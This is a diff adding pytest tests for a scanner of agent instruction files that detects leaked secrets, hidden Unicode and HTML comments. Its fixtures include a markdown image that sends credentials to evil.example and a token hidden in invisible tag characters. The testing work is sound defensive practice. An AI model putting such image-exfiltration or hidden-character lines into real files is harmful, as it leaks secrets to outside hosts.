@@ -215,3 +215,65 @@ def test_the_secure_fixture_has_only_a_fenced_placeholder():
         True,
         True,
     )
+
+
+# --- Secrets never leak through other fields ------------------------------------
+
+LEAKS = [
+    "![x](https://bob:Pq7zLm2Vx9Kw@evil.example/a.png)",
+    "clone https://tok_Pq7zLm2Vx9Kw4Rt8@git.example/repo.git",
+    "<!-- deploy key: API_KEY=Pq7zLm2Vx9Kw4Rt8 -->",
+    "- ok" + "".join(chr(0xE0000 + ord(c)) for c in "TOKEN=Pq7zLm2Vx9Kw4Rt8"),
+]
+
+
+@pytest.mark.parametrize("line", LEAKS)
+def test_no_field_of_any_hit_repeats_a_secret(line):
+    hits = scan_instructions.scan_text(line + "\n")
+    assert hits
+    assert "Pq7zLm2Vx9Kw" not in json.dumps(hits)
+
+
+def test_a_token_used_as_a_url_username_is_a_secret():
+    hit = only_hit("clone https://tok_Pq7zLm2Vx9Kw4Rt8@git.example/r.git\n", "secret")
+    assert hit["check"] == "A1"
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "Authorization: Bearer Pq7zLm2Vx9Kw4Rt8Yh3n",
+        "aws AKIAPQ7ZLM2VX9KW4RT8",
+        "use ghp_Pq7zLm2Vx9Kw4Rt8Yh3nB6cD1eF5gH0jK2m",
+    ],
+)
+def test_well_known_token_shapes_are_secrets(line):
+    hit = only_hit(line + "\n", "secret")
+    assert "Pq7zLm2Vx9Kw" not in json.dumps(hit)
+
+
+def test_token_counts_are_not_secrets():
+    assert kinds("max_tokens: 4096\ntoken_limit = 8000\n") == []
+
+
+@pytest.mark.parametrize("char", ["‎", "‏", "؜", "️", "\U000e0100"])
+def test_direction_marks_and_variation_selectors_are_reported(char):
+    assert kinds(f"a{char}b\n") in (["invisible-unicode"], ["bidi-control"])
+
+
+def test_a_missing_file_does_not_stop_the_others(tmp_path, capsys):
+    ok = tmp_path / "AGENTS.md"
+    ok.write_text("<!-- x -->\n", encoding="utf-8")
+    assert scan_instructions.main([str(tmp_path / "nope.md"), str(ok)]) == 0
+    report = json.loads(capsys.readouterr().out)
+    assert [h["kind"] for h in report["hits"]] == ["missing", "html-comment"]
+
+
+def test_a_short_live_key_in_a_comment_is_masked():
+    hits = scan_instructions.scan_text("<!-- api key is sk_live_51Pq7zLm2V -->\n")
+    assert "51Pq7zLm2V" not in json.dumps(hits)
+
+
+def test_a_token_in_a_url_is_reported_once():
+    line = "clone https://ghp_Pq7zLm2Vx9Kw4Rt8Yh3nB6cD1eF5gH0jK2m@github.com/o/r\n"
+    assert kinds(line) == ["secret"]
